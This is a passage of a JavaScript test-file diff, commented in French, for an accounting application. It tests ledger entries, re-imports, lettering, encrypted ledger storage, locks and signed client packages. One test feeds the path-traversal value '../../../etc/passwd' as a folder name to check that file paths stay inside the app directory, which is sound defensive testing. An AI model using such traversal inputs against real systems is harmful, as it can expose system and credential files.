+    // 1..n sans trou (invariant 3).
+    const nums = l.ecritures.filter(e => e.statut === 'validee').map(e => e.numero).sort((x, y) => x - y);
+    assert.deepStrictEqual(nums, [1, 2]);
+    // Revalider est refusé : c'est ce qui empêche un second numéro sur la même pièce.
+    assert.strictEqual(KL.validerEcriture(l, a.id, 'moi', 5).ok, false);
+  });
+
+  t('9.2.0 : une validée ne se modifie jamais — elle se contre-passe, à la date du jour', () => {
+    const { l, v } = faitLivre();
+    const a = v('2026-01-20', 'FAC-2026-001', 1000, 'd1');
+    KL.validerEcriture(l, a.id, 'moi', 1);
+    const cp = KL.contrepasser(l, a.id, 'moi', '2026-04-02', 2);
+    assert.ok(cp.ok);
+    assert.strictEqual(a.statut, 'contrepassee');
+    // La date est celle du jour où l'on corrige, JAMAIS celle de l'écriture d'origine : corriger en
+    // avril une écriture de janvier dans un janvier déjà déclaré changerait la TVA de janvier.
+    assert.strictEqual(cp.ecriture.date, '2026-04-02');
+    assert.strictEqual(cp.ecriture.contrepasseDe, a.id);
+    // Le miroir, colonne par colonne.
+    a.lignes.forEach((l0, i) => {
+      assert.strictEqual(cp.ecriture.lignes[i].debit, l0.credit);
+      assert.strictEqual(cp.ecriture.lignes[i].credit, l0.debit);
+    });
+    // Et l'ensemble se solde : c'est la preuve que la contre-passation annule.
+    const b = KL.balanceDepuisLignes(KL.lignesDuLivre(l));
+    assert.strictEqual(b.totaux.debit, b.totaux.credit);
+    b.rows.forEach(r => assert.strictEqual(r.solde, 0, `${r.account} ne se solde pas après contre-passation`));
+    // Deux fois, non : on aurait deux miroirs pour une écriture.
+    assert.strictEqual(KL.contrepasser(l, a.id, 'moi', '2026-04-03', 3).ok, false);
+    // Un brouillard ne se contre-passe pas : il se modifie.
+    const br = v('2026-05-01', 'FAC-2026-009', 100, 'd9');
+    assert.ok(/se modifie/.test(KL.contrepasser(l, br.id, 'moi', '2026-05-02', 4).motif));
+  });
+
+  t('9.2.0 : un mois renvoyé remplace les brouillards et ne TOUCHE JAMAIS une validée', () => {
+    const { l, v } = faitLivre();
+    // Mars arrive une première fois, provisoire : deux pièces, en brouillard.
+    const p1 = [
+      { date: '2026-03-04', journal: 'VT', piece: 'FAC-2026-010', docId: 'd10', libelle: 'A', lignes: [{ compte: '411001', debit: 1190 }, { compte: '706', credit: 1000 }, { compte: '4367', credit: 190 }] },
+      { date: '2026-03-08', journal: 'VT', piece: 'FAC-2026-011', docId: 'd11', libelle: 'B', lignes: [{ compte: '411001', debit: 595 }, { compte: '706', credit: 500 }, { compte: '4367', credit: 95 }] }
+    ];
+    let r = KL.importerPaquet(l, '2026-03', p1, false, 'import', 10);
+    assert.strictEqual(r.ajoutees, 2);
+    assert.strictEqual(r.validees, 0, 'un mois provisoire n\'entre pas validé');
+    assert.ok(l.ecritures.every(e => e.statut === 'brouillard'));
+
+    // Le comptable valide la première, et pas la seconde.
+    const d10 = l.ecritures.find(e => e.docId === 'd10');
+    assert.ok(KL.validerEcriture(l, d10.id, 'moi', 11).ok);
+
+    // Le client rouvre mars et renvoie : les DEUX pièces ont changé de montant.
+    const p2 = [
+      { date: '2026-03-04', journal: 'VT', piece: 'FAC-2026-010', docId: 'd10', libelle: 'A', lignes: [{ compte: '411001', debit: 2380 }, { compte: '706', credit: 2000 }, { compte: '4367', credit: 380 }] },
+      { date: '2026-03-08', journal: 'VT', piece: 'FAC-2026-011', docId: 'd11', libelle: 'B', lignes: [{ compte: '411001', debit: 714 }, { compte: '706', credit: 600 }, { compte: '4367', credit: 114 }] }
+    ];
+    r = KL.importerPaquet(l, '2026-03', p2, true, 'import', 12);
+    // La validée est INTACTE, et l'écart est dit.
+    assert.strictEqual(d10.lignes[0].debit, 1190, 'une validée ne bouge JAMAIS');
+    assert.strictEqual(d10.statut, 'validee');
+    assert.strictEqual(r.ecarts.length, 1);
+    assert.strictEqual(r.ecarts[0].id, d10.id);
+    assert.strictEqual(r.ecarts[0].avant, 1190);
+    assert.strictEqual(r.ecarts[0].apres, 2380);
+    // Le brouillard, lui, a bien été remplacé — et une seule fois, pas deux pièces côte à côte.
+    const d11 = l.ecritures.filter(e => e.docId === 'd11');
+    assert.strictEqual(d11.length, 1, 'un mois renvoyé ne doit pas empiler deux versions du brouillard');
+    assert.strictEqual(d11[0].lignes[0].debit, 714);
+    assert.strictEqual(r.remplacees, 1);
+    // Mois définitif : ce qui entre est validé.
+    assert.strictEqual(d11[0].statut, 'validee');
+    // L'audit garde tout (jamais purgé).
+    assert.strictEqual(l.audit.filter(a => a.quoi === 'import-paquet').length, 2);
+  });
+
+  t('9.2.0 : un lettrage qui ne solde pas est refusé, avec son écart', () => {
+    const { l, v } = faitLivre();
+    const fac = v('2026-02-01', 'FAC-2026-020', 1000, 'd20');
+    KL.validerEcriture(l, fac.id, 'moi', 1);
+    const reg = KL.ajouterEcriture(l, {
+      date: '2026-02-20', journal: 'BQ', piece: 'REG-1', libelle: 'Règlement',
+      lignes: [{ compte: '532', debit: 1190 }, { compte: '411001', credit: 1190 }]
+    }, 'moi', 2);
+    KL.validerEcriture(l, reg.id, 'moi', 3);
+
+    // Une seule écriture ne se lettre pas : le lettrage RELIE.
+    assert.ok(/au moins deux/.test(KL.lettrer(l, '411001', [fac.id], '', 'moi', '2026-03-01').motif));
+    // Un règlement partiel ne solde pas — et c'est justement ce qu'il ne faut pas laisser passer :
+    // un lettrage qui ne solde pas affirme qu'une facture est payée alors qu'il reste quelque chose.
+    const part = KL.ajouterEcriture(l, { date: '2026-02-25', journal: 'BQ', piece: 'REG-2', lignes: [{ compte: '532', debit: 500 }, { compte: '411001', credit: 500 }] }, 'moi', 4);
+    KL.validerEcriture(l, part.id, 'moi', 5);
+    const ko = KL.lettrer(l, '411001', [fac.id, reg.id, part.id], '', 'moi', '2026-03-01');
+    assert.strictEqual(ko.ok, false);
+    assert.strictEqual(ko.ecart, -500);
+    assert.ok(/il reste/.test(ko.motif), ko.motif);
+    assert.strictEqual(l.lettrages.length, 0, 'un lettrage refusé ne laisse aucune trace');
+
+    // Le bon lettrage passe, pose la lettre sur les lignes du compte, et sur celles-là seulement.
+    const ok = KL.lettrer(l, '411001', [fac.id, reg.id], '', 'moi', '2026-03-01');
+    assert.strictEqual(ok.ok, true);
+    assert.strictEqual(ok.lettre, 'A');
+    assert.strictEqual(fac.lignes.find(x => x.compte === '411001').lettre, 'A');
+    assert.strictEqual(fac.lignes.find(x => x.compte === '706').lettre, '', 'la lettre ne touche que le compte lettré');
+    // Et le délettrage rend tout.
+    assert.ok(KL.delettrer(l, 'A', 'moi', 6).ok);
+    assert.strictEqual(fac.lignes.find(x => x.compte === '411001').lettre, '');
+    assert.strictEqual(l.lettrages.length, 0);
+    assert.strictEqual(KL.delettrer(l, 'A', 'moi', 7).ok, false);
+  });
+
+  t('9.2.0 : une balance d\'ouverture déséquilibrée est refusée, avec l\'écart', () => {
+    const l = KL.livreVide('MAT:1', 2026);
+    const ko = KL.balanceOuverture(l, [{ compte: '532', debit: 10000 }, { compte: '101', credit: 9000 }], '2026-01-01', 'balance', 'moi', 1);
+    assert.strictEqual(ko.ok, false);
+    assert.strictEqual(ko.ecart, 1000);
+    assert.ok(/ne s'équilibre pas/.test(ko.motif), ko.motif);
+    assert.strictEqual(l.ecritures.length, 0, 'une reprise refusée ne laisse rien derrière elle');
+
+    const ok = KL.balanceOuverture(l, [
+      { compte: '532', libelle: 'Banque', debit: 10000 },
+      { compte: '411001', libelle: 'Client A', debit: 2000 },
+      { compte: '101', libelle: 'Capital', credit: 12000 }
+    ], '2026-01-01', 'balance', 'moi', 2);
+    assert.strictEqual(ok.ok, true);
+    assert.strictEqual(ok.total, 12000);
+    // UNE écriture AN, pièce OUVERTURE, validée d'office : elle ne se met pas en brouillard.
+    assert.strictEqual(l.ecritures.length, 1);
+    assert.strictEqual(l.ecritures[0].journal, 'AN');
+    assert.strictEqual(l.ecritures[0].piece, 'OUVERTURE');
+    assert.strictEqual(l.ecritures[0].statut, 'validee');
+    assert.strictEqual(l.ecritures[0].numero, 1);
+    // Les comptes inconnus sont entrés au plan, jamais refusés en silence (invariant 2).
+    assert.strictEqual(l.plan.length, 3);
+    assert.ok(l.plan.every(c => c.source === 'import'));
+    assert.strictEqual(l.plan.find(c => c.compte === '532').nature, 'tresorerie');
+    assert.strictEqual(l.plan.find(c => c.compte === '411001').nature, 'tiers');
+    assert.strictEqual(l.plan.find(c => c.compte === '101').nature, 'bilan');
+    // La refaire est permise tant qu'elle est seule.
+    assert.ok(KL.balanceOuverture(l, [{ compte: '532', debit: 5000 }, { compte: '101', credit: 5000 }], '2026-01-01', 'balance', 'moi', 3).ok);
+    assert.strictEqual(l.ecritures.length, 1, 'une seconde reprise remplace la première, elle ne s\'y ajoute pas');
+    // Mais plus une fois que le livre porte autre chose : tout ce qui suit s'appuie dessus.
+    KL.ajouterEcriture(l, { date: '2026-02-01', journal: 'VT', piece: 'F1', lignes: [{ compte: '411001', debit: 100 }, { compte: '706', credit: 100 }] }, 'moi', 4);
+    assert.strictEqual(KL.balanceOuverture(l, [{ compte: '532', debit: 1 }, { compte: '101', credit: 1 }], '2026-01-01', 'balance', 'moi', 5).ok, false);
+  });
+
+  t('9.2.0 : un brouillard n\'entre dans aucune balance', () => {
+    const { l, v } = faitLivre();
+    const a = v('2026-03-04', 'FAC-1', 1000, 'd1');
+    v('2026-03-05', 'FAC-2', 9999, 'd2');           // reste en brouillard
+    KL.validerEcriture(l, a.id, 'moi', 1);
+    const b = KL.balanceDepuisLignes(KL.lignesDuLivre(l));
+    assert.strictEqual(b.totaux.debit, 1190, 'un brouillard n\'est pas encore de la comptabilité');
+    // Mais l'écran qui VEUT le voir peut le demander : c'est la saisie du jour.
+    const bb = KL.balanceDepuisLignes(KL.lignesDuLivre(l, { brouillard: true }));
+    assert.strictEqual(bb.totaux.debit, KL.round3(1190 + 9999 * 1.19));
+    // Et les quatre lectures de la 9.1.0 marchent telles quelles sur le livre : c'est tout l'intérêt.
+    assert.strictEqual(KL.journalDepuisLignes(KL.lignesDuLivre(l)).pieces.length, 1);
+    assert.ok(KL.grandLivreDepuisLignes(KL.lignesDuLivre(l)).comptes.length >= 3);
+  });
+
+  t('9.2.0 : le plan et la balance s\'importent par NOM de colonne, et la ligne fautive est nommée', () => {
+    // TEST-9.2.0-010/011. Un plan exporté d'un autre logiciel n'a ni les mêmes colonnes ni le même
+    // ordre : aligner par position mettrait des libellés dans « Débit » sans que rien ne plante.
+    const p = KL.planDepuisCsv([
+      ['Intitulé', 'Numéro de compte', 'Nature'],          // ordre inversé, entêtes autres
+      ['Clients', '411', ''],
+      ['Banque', '532', ''],
+      ['Ventes de services', '706', 'gestion'],
+      ['', '707', ''],                                      // libellé manquant
+      ['Un texte', 'ABC', ''],                              // pas un numéro
+      ['Doublon', '411', ''],                               // déjà vu
+      ['', '', '']                                          // ligne vide : on n'en parle pas
+    ]);
+    assert.strictEqual(p.motif, '');
+    assert.deepStrictEqual(p.comptes.map(c => c.compte), ['411', '532', '706']);
+    assert.strictEqual(p.comptes[0].libelle, 'Clients');
+    // La nature se DÉDUIT de la classe quand la colonne ne la donne pas.
+    assert.strictEqual(p.comptes[0].nature, 'tiers');
+    assert.strictEqual(p.comptes[1].nature, 'tresorerie');
+    assert.strictEqual(p.comptes[2].nature, 'gestion');
+    // Trois lignes ignorées, chacune NOMMÉE avec son numéro de ligne : un import qui dit « 3 lignes
+    // ignorées » sans dire lesquelles oblige à relire le fichier à la main.
+    assert.strictEqual(p.ignorees.length, 3);
+    assert.deepStrictEqual(p.ignorees.map(x => x.ligne), [5, 6, 7]);
+    assert.ok(/libellé/.test(p.ignorees[0].motif));
+    assert.ok(/deux fois/.test(p.ignorees[2].motif));
+    // Sans les deux colonnes indispensables, on refuse en disant lesquelles.
+    assert.ok(/Compte/.test(KL.planDepuisCsv([['Truc', 'Machin'], ['a', 'b']]).motif));
+
+    const b = KL.balanceDepuisCsv([
+      ['Compte', 'Libellé', 'Solde débiteur', 'Solde créditeur'],
+      ['532', 'Banque', '10 000,000', ''],
+      ['411001', 'Client A', '2.000,500', '0'],             // 1.234,56 et 1 234,56 tous deux lus
+      ['101', 'Capital', '', '12000.5'],
+      ['70', 'À zéro', '0', '0'],                            // un compte à zéro n'ouvre rien
+      ['ZZ', 'Pas un compte', '5', '']
+    ]);
+    assert.strictEqual(b.motif, '');
+    assert.deepStrictEqual(b.lignes.map(l => l.compte), ['532', '411001', '101']);
+    assert.strictEqual(b.lignes[0].debit, 10000);
+    assert.strictEqual(b.lignes[1].debit, 2000.5);
+    assert.strictEqual(b.lignes[2].credit, 12000.5);
+    assert.strictEqual(b.ignorees.length, 1);
+    assert.strictEqual(b.ignorees[0].ligne, 6);
+    // Et elle se branche sur la reprise sans rien reformater.
+    const l = KL.livreVide('MAT:1', 2026);
+    assert.ok(KL.balanceOuverture(l, b.lignes, '2026-01-01', 'balance', 'moi', 1).ok);
+  });
+
+  t('9.2.0 : le livre s\'écrit en BINAIRE, entête en clair, et un illisible n\'est jamais écrasé', () => {
+    const S = require('../src/cabinet/cabstore.js');
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'skan-livre-'));
+    try {
+      const st = S.createCabStore(dir, {});
+      st.create('un-mot-de-passe', { cabinet: { name: 'Cabinet Essai' }, dossiers: [] });
+      const d = { id: 'MAT:1234567A', name: 'Client Test', matricule: '1234567A' };
+      const l = KL.livreVide('MAT:1234567A', 2026);
+      KL.ajouterEcriture(l, { date: '2026-01-04', journal: 'VT', piece: 'F1', lignes: [{ compte: '411', debit: 100 }, { compte: '706', credit: 100 }] }, 'moi', 1);
+      assert.ok(st.ecrireLivre(d, l).ok);
+
+      const f = st.livrePath(d, 2026);
+      const buf = fs.readFileSync(f);
+      const nl = buf.indexOf(0x0a);
+      const tete = JSON.parse(buf.slice(0, nl).toString('utf8'));
+      // L'entête reste LISIBLE : un livre retrouvé sur une clé USB doit dire de quel client et de
+      // quelle année il parle avant qu'on cherche son mot de passe.
+      assert.strictEqual(tete['skanfact-livre'], 1);
+      assert.strictEqual(tete.dossier, 'MAT:1234567A');
+      assert.strictEqual(tete.exercice, 2026);
+      assert.strictEqual(tete.nom, 'Client Test');
+      // Et le corps est BINAIRE, pas base64 — c'est la mesure du 16/09 qui l'a décidé (59 % du
+      // temps d'écriture). Un corps base64 n'utiliserait que 64 caractères imprimables.
+      const corps = buf.slice(nl + 1);
+      assert.ok(corps.length > 0);
+      assert.ok(corps.some(b => b > 127 || b < 9), 'le corps doit être binaire, pas base64');
+      // Rien du contenu ne fuit dans l'entête : le nombre d'écritures n'est pas un secret, leur
+      // contenu si.
+      assert.ok(!buf.slice(0, nl).includes(Buffer.from('706')), 'aucun compte ne doit figurer en clair');
+
+      const r = st.lireLivre(d, 2026);
+      assert.strictEqual(r.livre.ecritures.length, 1);
+      assert.strictEqual(r.livre.dossier, 'MAT:1234567A');
+      // L'entête se lit SANS la clé.
+      const h = st.enteteLivre(f);
+      assert.strictEqual(h.exercice, 2026);
+      // Absent : on le DIT, on ne fabrique pas un livre en silence.
+      assert.deepStrictEqual(st.lireLivre(d, 2025), { absent: true });
+      // L'index évite d'ouvrir soixante fichiers pour dessiner une liste.
+      const idx = st.lireIndexLivres(d);
+      assert.strictEqual(idx.exercices.length, 1);
+      assert.strictEqual(idx.exercices[0].brouillards, 1);
+
+      // Une version SUPÉRIEURE n'est ni lue ni réécrite : elle porterait ce qu'on ne sait pas garder.
+      const futur = { ...l, format: 9 };
+      fs.writeFileSync(f, Buffer.concat([
+        Buffer.from(JSON.stringify({ 'skanfact-livre': 1, kdf: 'scrypt', salt: 'x', iv: 'y', tag: 'z' }) + '\n'),
+        Buffer.from('x')
+      ]));
+      assert.ok(st.lireLivre(d, 2026).illisible, 'un fichier abîmé se dit illisible, il ne plante pas');
+      // Et il est mis de côté, jamais écrasé : c'est la règle qui a sauvé l'app entreprise.
+      st.ecrireLivre(d, l);
+
+      // Le cas qui compte vraiment, et qu'un fichier simplement brouillé NE couvre pas : un fichier
+      // qui se DÉCHIFFRE correctement mais n'est pas un livre. Le déchiffrement ne dit rien de la
+      // forme, et c'est là qu'un contrôle manquant laisserait l'application travailler sur un objet
+      // qui n'a ni écritures ni exercice. On le fabrique avec la clé de la session, comme le fait
+      // `npm run charge` — pas en imitant le format, en l'écrivant vraiment.
+      const nodeCrypto = require('crypto');
+      const iv = nodeCrypto.randomBytes(12);
+      const ci = nodeCrypto.createCipheriv('aes-256-gcm', st.state.key, iv);
+      const corpsFaux = Buffer.concat([ci.update(Buffer.from(JSON.stringify({ pas: 'un livre' }))), ci.final()]);
+      fs.writeFileSync(f, Buffer.concat([
+        Buffer.from(JSON.stringify({ 'skanfact-livre': 1, kdf: 'scrypt', salt: st.state.salt.toString('base64'), iv: iv.toString('base64'), tag: ci.getAuthTag().toString('base64') }) + '\n'),
+        corpsFaux
+      ]));
+      const faux = st.lireLivre(d, 2026);
+      assert.ok(faux.illisible, 'un fichier qui se déchiffre mais n\'est pas un livre doit être refusé');
+      assert.ok(faux.misDeCote && fs.existsSync(faux.misDeCote), 'il est mis de côté, jamais écrasé');
+      // Et le fichier mis de côté porte bien ce qu'on a trouvé : on ne l'a pas perdu en route.
+      assert.ok(fs.readFileSync(faux.misDeCote).length > 0);
+
+      // Une génération précédente est gardée à chaque écriture.
+      assert.ok(fs.existsSync(f.replace(/\.json$/, '.precedent.json')), 'la version précédente doit survivre à une écriture');
+      // La version inconnue se reconnaît sur l'objet, avant toute écriture.
+      assert.ok(KL.livreVersionInconnue(futur));
+
+      // Un nom de dossier ne peut pas faire sortir du dossier de l'application : `slug` retire tout
+      // ce qui n'est ni lettre ni chiffre AVANT de fabriquer le chemin, donc `../../../etc` devient
+      // « etc ». Le contrôle de chemin qui suit est la ceinture par-dessus les bretelles — on
+      // vérifie ce qui est vrai (le fichier reste dedans), pas une exception qui ne peut pas venir.
+      const piege = st.livrePath({ id: 'x', name: '../../../etc/passwd' }, 2026);
+      assert.ok(path.resolve(piege).startsWith(path.resolve(dir) + path.sep), piege);
+      assert.ok(!piege.includes('..'));
+      // L'année, elle, sert telle quelle dans le nom du fichier : elle est donc contrôlée.
+      assert.throws(() => st.livrePath(d, '../2026'), /Exercice invalide/);
+      assert.throws(() => st.livrePath(d, '20'), /Exercice invalide/);
+    } finally { fs.rmSync(dir, { recursive: true, force: true }); }
+  });
+
+  t('9.2.0 : un livre ouvert ailleurs ne s\'écrase pas — et le verrou périme', () => {
+    const S = require('../src/cabinet/cabstore.js');
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'skan-verrou-'));
+    try {
+      let jour = new Date('2026-05-01T09:00:00Z');
+      const st = S.createCabStore(dir, { now: () => jour });
+      st.create('mdp', { cabinet: { name: 'C' }, dossiers: [] });
+      const d = { id: 'MAT:1', name: 'Client', matricule: '1' };
+      const moi = { deviceId: 'poste-A', deviceName: 'Mac de Skander' };
+      const autre = { deviceId: 'poste-B', deviceName: 'PC du bureau' };
+
+      assert.strictEqual(st.lireVerrou(d, 2026), null);
+      assert.strictEqual(st.poserVerrou(d, 2026, moi).ok, true);
+      // Le même poste repasse : ce n'est pas un conflit, c'est la même personne.
+      assert.strictEqual(st.poserVerrou(d, 2026, moi).ok, true);
+      // Un autre poste est refusé, et on lui DIT lequel — « verrouillé » sans nom ne sert à rien.
+      const ko = st.poserVerrou(d, 2026, autre);
+      assert.strictEqual(ko.ok, false);
+      assert.strictEqual(ko.verrou.deviceName, 'Mac de Skander');
+
+      // Et il PÉRIME à 24 h : un poste qui plante laisserait sinon un dossier verrouillé pour
+      // toujours, ce qui est pire que le risque qu'il évite.
+      jour = new Date('2026-05-02T10:00:00Z');
+      assert.strictEqual(st.lireVerrou(d, 2026), null, 'un verrou de plus de 24 h ne compte plus');
+      assert.strictEqual(st.poserVerrou(d, 2026, autre).ok, true);
+      st.leverVerrou(d, 2026);
+      assert.strictEqual(st.lireVerrou(d, 2026), null);
+    } finally { fs.rmSync(dir, { recursive: true, force: true }); }
+  });
+
+  t('9.2.0 : la copie externe emporte les livres, toujours', () => {
+    const S = require('../src/cabinet/cabstore.js');
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'skan-mir-'));
+    const ext = fs.mkdtempSync(path.join(os.tmpdir(), 'skan-usb-'));
+    try {
+      const st = S.createCabStore(dir, { externalDir: ext });
+      st.create('mdp', { cabinet: { name: 'C' }, dossiers: [] });
+      const d = { id: 'MAT:1', name: 'Client', matricule: '1' };
+      const l = KL.livreVide('MAT:1', 2026);
+      KL.ajouterEcriture(l, { date: '2026-01-04', journal: 'VT', piece: 'F1', lignes: [{ compte: '411', debit: 100 }, { compte: '706', credit: 100 }] }, 'moi', 1);
+      st.ecrireLivre(d, l);
+      // Sans les paquets : un paquet perdu se redemande au client, un livre perdu non — il porte
+      // le travail du comptable, et personne d'autre ne l'a.
+      assert.strictEqual(st.mirrorExternal(), true);
+      const copie = path.join(ext, 'SkanFact Cabinet', 'livres', 'Client', 'livre-2026.json');
+      assert.ok(fs.existsSync(copie), 'le livre doit partir avec la copie externe');
+      assert.strictEqual(fs.readFileSync(copie).length, fs.readFileSync(st.livrePath(d, 2026)).length);
+    } finally { [dir, ext].forEach(x => fs.rmSync(x, { recursive: true, force: true })); }
+  });
+
+  // ---------------------------------------------------------------- 9.2.0 — le paquet SIGNÉ
+
+  t('9.2.0 : chiffrer n\'est pas signer — la signature porte les OCTETS du manifeste', () => {
+    const Z = require('../src/zip.js');
+    const k = Z.generateClientKeys();
+    // Ed25519 pour signer, pas X25519 : deux courbes pour deux métiers, et Node refuse la seconde.
+    assert.ok(k.publicKey && k.privateKey && k.publicKey !== k.privateKey);
+    const manifeste = { entreprise: { nom: 'Alpha', matricule: '1234567A' }, periode: { mois: '2026-03' }, fichiers: [] };
+    const buf = Buffer.from(JSON.stringify(manifeste, null, 2), 'utf8');
+    const sig = Z.signManifest(buf, k.privateKey, k.publicKey);
+    assert.strictEqual(sig.format, 1);
+    assert.strictEqual(sig.alg, 'ed25519');
+    assert.strictEqual(sig.manifeste, Z.sha256(buf));
+    assert.strictEqual(sig.empreinte, Z.keyFingerprint(k.publicKey));
+    // La clé PRIVÉE ne figure jamais dans la signature — c'est la faute qui ne se rattrape pas.
+    assert.ok(!JSON.stringify(sig).includes(k.privateKey));
+
+    assert.strictEqual(Z.verifyManifest(buf, sig).ok, true);
+    assert.strictEqual(Z.verifyManifest(buf, sig).empreinte, sig.empreinte);
+
+    // UN octet du manifeste retourné : la phrase attendue est « modifié », pas « signature
+    // inconnue ». C'est la raison d'être du sha256 — Ed25519 ferait échouer `verify` de toute
+    // façon, mais le comptable n'aurait pas la bonne phrase pour son coup de téléphone.
+    const abime = Buffer.from(buf);
+    abime[20] = abime[20] === 65 ? 66 : 65;
+    const r = Z.verifyManifest(abime, sig);
+    assert.strictEqual(r.ok, false);
+    assert.strictEqual(r.motif, 'manifeste-modifie');
+    assert.ok(/modifié après sa signature/.test(r.texte), r.texte);
+
+    // Une signature d'une AUTRE clé sur le même manifeste : elle est valable, mais pas la sienne.
+    const k2 = Z.generateClientKeys();
+    const sig2 = Z.signManifest(buf, k2.privateKey, k2.publicKey);
+    assert.strictEqual(Z.verifyManifest(buf, sig2).ok, true);
+    assert.notStrictEqual(sig2.empreinte, sig.empreinte);
+    // Une signature bricolée ne passe pas.
+    assert.strictEqual(Z.verifyManifest(buf, { ...sig, sig: Buffer.alloc(64).toString('base64url') }).motif, 'signature-fausse');
+    assert.strictEqual(Z.verifyManifest(buf, { ...sig, alg: 'rsa' }).motif, 'illisible');
+    assert.strictEqual(Z.verifyManifest(buf, null).motif, 'illisible');
+    // Et la clé remplacée par une autre, signature d'origine gardée : c'est l'attaque évidente.
+    assert.strictEqual(Z.verifyManifest(buf, { ...sig, cle: k2.publicKey }).motif, 'signature-fausse');
+  });
+
+  t('9.2.0 : les quatre cas d\'origine, et la tolérance qui s\'éteint d\'elle-même', () => {
+    const vide = { id: 'MF:1' };
+    const epingle = { id: 'MF:1', cleEmpreinte: 'AAAA-BBBB-CCCC-DDDD-EEEE' };
+    const bonne = { ok: true, cle: 'K', empreinte: 'AAAA-BBBB-CCCC-DDDD-EEEE' };
+    const autre = { ok: true, cle: 'K2', empreinte: 'ZZZZ-1111-2222-3333-4444' };
+
+    // 1. Un paquet d'un client encore en 9.1.x passe, en gris. Le refuser couperait tous les
+    // clients d'un coup le jour où le cabinet se met à jour.
+    const c1 = cab.verdictOrigine(vide, null);
+    assert.strictEqual(c1.ok, true);
+    assert.strictEqual(c1.etat, 'non-prouvee');
+    assert.strictEqual(c1.epingler, null);
+    assert.ok(/antérieure à la 9.2.0/.test(c1.texte));
+
+    // 2. Une fois qu'un client a signé, ne plus signer est refusé : la tolérance du cas 1 s'éteint
+    // CLIENT PAR CLIENT, sans date butoir imposée à tout le portefeuille. C'est la confiance au
+    // premier usage, et c'est ce qui fait qu'elle ne reste pas ouverte pour toujours.
+    const c2 = cab.verdictOrigine(epingle, null);
+    assert.strictEqual(c2.ok, false);
+    assert.strictEqual(c2.code, 'ERR-CAB-031');
+    assert.ok(/mettre SkanFact à jour/.test(c2.texte));
+
+    // 3. Premier paquet signé : on épingle.
+    const c3 = cab.verdictOrigine(vide, bonne);
+    assert.strictEqual(c3.ok, true);
+    assert.strictEqual(c3.etat, 'epinglee');
+    assert.strictEqual(c3.epingler, 'K');
+
+    // 4. Une autre clé : refusé, en NOMMANT les deux empreintes — « refusé » sans les deux
+    // empreintes n'apprend rien à quelqu'un qui doit appeler son client.
+    const c4 = cab.verdictOrigine(epingle, autre);
+    assert.strictEqual(c4.ok, false);
+    assert.strictEqual(c4.code, 'ERR-CAB-030');
+    assert.ok(c4.texte.includes('AAAA-BBBB-CCCC-DDDD-EEEE') && c4.texte.includes('ZZZZ-1111-2222-3333-4444'));
+    assert.ok(/de vive voix/.test(c4.texte), 'la reprise d\'une clé passe par un geste humain');
+
+    // 5. La même clé : rien à faire, et on ne ré-épingle pas.
+    const c5 = cab.verdictOrigine(epingle, bonne);
+    assert.strictEqual(c5.ok, true);
+    assert.strictEqual(c5.etat, 'signe');
+    assert.strictEqual(c5.epingler, null);
+
+    // Une signature fausse ne devient jamais un épinglage, même sur un dossier vierge — sinon
+    // n'importe quel paquet fixerait la clé du client dès le premier envoi.
+    const ko = cab.verdictOrigine(vide, { ok: false, motif: 'signature-fausse', texte: 'x' });
+    assert.strictEqual(ko.ok, false);
+    assert.ok(!ko.epingler);
+  });
+
+  t('9.2.0 : la clé épinglée survit au chargement — un champ oublié la jetterait en silence', () => {
+    // Le défaut de `matricule` en 6.8.0, appliqué à un champ de sécurité : absent de
+    // `migrateDossier`, il disparaît au prochain démarrage et la vérification d'origine se
+    // désarme toute seule, sans qu'aucun écran ne le dise.
+    const m = cab.migrate({ dossiers: [{
+      id: 'MF:1', name: 'Alpha',
+      clePublique: 'UNE-CLE', cleEmpreinte: 'AAAA-BBBB-CCCC-DDDD-EEEE',
+      cleEpingleeLe: '2026-03-01T10:00:00.000Z',
+      audit: [{ quand: 1, quoi: 'cle-epinglee', detail: 'AAAA' }]
+    }] });
+    const d = m.dossiers[0];
+    assert.strictEqual(d.clePublique, 'UNE-CLE');
+    assert.strictEqual(d.cleEmpreinte, 'AAAA-BBBB-CCCC-DDDD-EEEE');
+    assert.strictEqual(d.cleEpingleeLe, '2026-03-01T10:00:00.000Z');
+    assert.strictEqual(d.audit.length, 1);
+    // Et un dossier d'avant la 9.2.0 n'en a pas : il ne doit pas en inventer.
+    const vieux = cab.migrate({ dossiers: [{ id: 'MF:2', name: 'Beta' }] }).dossiers[0];
+    assert.strictEqual(vieux.cleEmpreinte, '');
+    assert.deepStrictEqual(vieux.audit, []);
+  });
+
+  t('9.2.0 : l\'entreprise signe son paquet, et sa clé privée ne sort jamais du dossier', () => {
+    const main = lireSource('src', 'main.js');
+    // La clé vit DANS le dossier de l'entreprise, comme la licence : un ordinateur ouvre plusieurs
+    // entreprises, et c'est l'ENTREPRISE qui signe, pas le poste.
+    assert.ok(/const CLE_CLIENT = \(\) => path\.join\(currentDossier\(\)\.dir, 'cle-client\.json'\)/.test(main),
+      'la clé du client doit vivre dans le dossier de l\'entreprise');
+    // Hors de `skanfact-data.json` : une clé privée qui voyagerait dans un export ou dans le paquet
+    // ne serait plus une clé privée. Elle n'est donc écrite que par `cleClient`.
+    assert.strictEqual((main.match(/privateKey: k\.privateKey/g) || []).length, 1);
+    assert.ok(/mode: 0o600/.test(main.slice(main.indexOf('function cleClient'), main.indexOf('function cleClient') + 1200)),
+      'le fichier de clé doit être en 0600');
+    // Le paquet porte `signature.json`, écrit APRÈS le manifeste et sur ses octets EXACTS.
+    const zone = main.slice(main.indexOf('const manifestBuf = Buffer.from'), main.indexOf('const zip = zipBuffer'));
+    assert.ok(zone.length > 200 && zone.length < 3000, `tranche du manifeste suspecte : ${zone.length}`);
+    assert.ok(/signManifest\(manifestBuf, k\.privateKey, k\.publicKey\)/.test(zone),
+      'on signe les octets du manifeste, jamais un objet re-sérialisé');
+    assert.ok(/name: 'signature\.json'/.test(zone));
+    // Un échec de signature ne fait PAS échouer l'envoi : priver quelqu'un de son paquet mensuel
+    // pour une clé qu'on n'a pas su écrire serait pire que le paquet non signé.
+    assert.ok(/catch \(e\) \{[\s\S]{0,400}?logToFile\('signature du paquet'/.test(zone),
+      'un échec de signature doit se journaliser, pas interrompre l\'envoi');
+
+    // Côté cabinet : la vérification passe AVANT que le paquet soit rangé. Un paquet refusé ne doit
+    // rien laisser sur le disque, et surtout pas dans le dossier d'un client dont il usurpe le nom.
+    const cm = lireSource('src', 'cabinet', 'main.js');
